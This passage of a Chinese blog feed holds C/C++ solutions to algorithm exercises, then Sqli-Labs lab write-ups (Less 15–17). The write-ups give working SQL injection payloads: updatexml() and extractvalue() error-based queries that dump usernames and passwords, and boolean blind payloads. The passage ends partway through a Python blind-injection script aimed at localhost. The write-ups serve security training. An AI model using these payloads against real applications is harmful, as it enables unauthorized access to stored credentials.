class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Floyd-Warshall-算法"><a href="#Floyd-Warshall-算法" class="headerlink" title="Floyd-Warshall 算法"></a>Floyd-Warshall 算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 102</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"><span class="keyword">int</span> G[MAX][MAX];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> M = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G[i][j]);</div><div class="line">            <span class="keyword">if</span> ( G[i][j] == <span class="number">0</span>)</div><div class="line">                G[i][j] = INF;</div><div class="line">            <span class="keyword">if</span>  ( i == j )</div><div class="line">                G[i][j] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">    warshall_floyd();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            M = max(M, G[i][j]);</div><div class="line">    <span class="keyword">if</span> ( M  == INF)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, M<span class="number">-1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> k, i, j;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++)</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">                G[i][j] = min(G[i][j], G[i][k] + G[k][j]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? b : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1316"><a href="#1316" class="headerlink" title="1316"></a>1316</h2><h3 id="想法-4"><a href="#想法-4" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。有别于0/1背包问题。<br>每次选取尽量多的单位价值高的物体。</p>
<h3 id="提交-18"><a href="#提交-18" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近更新日期：2017-08-11&lt;br&gt;干脆把自己平日做的题放在一篇文章里吧。不然太分散了。&lt;br&gt;POJ: 1163 1182 1258 1273 1979 2236 2388 3069 3176 3253 3617&lt;br&gt;XOJ: 1004 1005 1022 1061 1062 1075 1078 1316&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less17-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/</id>
    <published>2017-08-23T10:16:52.000Z</published>
    <updated>2017-08-23T13:46:04.707Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-17 POST-Update Query-Error Based-String<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>三种基本语句。</p>
<h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT INTO table_name ( field1, field2,...fieldN )</div><div class="line">                       VALUES</div><div class="line">                       ( value1, value2,...valueN );</div></pre></td></tr></table></figure>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc users;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(20) | NO   |     | NULL    |                |</div><div class="line">| password | varchar(20) | NO   |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.06 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure></p>
<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</div><div class="line">[WHERE Clause]</div></pre></td></tr></table></figure>
<p>示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;atebyhc&quot; where id=15;                     </div><div class="line">Query OK, 1 row affected (0.08 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | atebyhc  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15;  </div><div class="line">Query OK, 1 row affected (0.00 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | atebyhc  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE table_name ;</div></pre></td></tr></table></figure>
<p>这个。。暂时先不演示了。。</p>
<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h1><p>这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=新密码 where username=账号；</div></pre></td></tr></table></figure></p>
<p>我们post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>则发现有报错回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>为单引号，所以可以推测语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;；</div></pre></td></tr></table></figure></p>
<p>接下去进行报错注入。</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>(以上来自<a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">学习笔记 UpdateXml() MYSQL显错注入</a>)</p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>可以获取数据库名为：security。</p>
<p>但要获取数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>却会显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</div></pre></td></tr></table></figure></p>
<p>也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。</p>
<p>这个可以先新建一张表，然后再在这个新建的临时表中进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这在sql.log中的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>其中<code>(select * from users)tmp</code>新建了一张tmp表，外面的<code>SELECT...FROM..</code>是从tmp中获取数据。</p>
<p>updatexml有长度限制,最长32位</p>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>得到数据库名称为 security</p>
<p>查字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>获取账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>对应的后端查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>extractvalue也有长度限制,最长32位</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://static.hx99.net/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-17 POST-Update Query-Error Based-String&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less15~16-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/</id>
    <published>2017-08-23T09:42:39.000Z</published>
    <updated>2017-08-23T10:16:14.267Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-15 POST- Blind-Boolian/time Based -Single quotes<br>Less-16 POST- Blind-Boolian/time Based -Double quotes<br><a id="more"></a></p>
<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h1><p>这关是盲注。没有回显。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。</p>
<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h1><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>登陆成功。</p>
<p>之后根据页面的登陆与否，构造逻辑语句利用脚本注入。</p>
<p>下面给个基于Less 16的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-16/index.php"</span></div><div class="line">	data = <span class="string">"uname="</span> + payload + <span class="string">"&amp;passwd=chybeta&amp;submit=Submit"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	content = requests.post(url,data=data,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"flag.jpg"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span 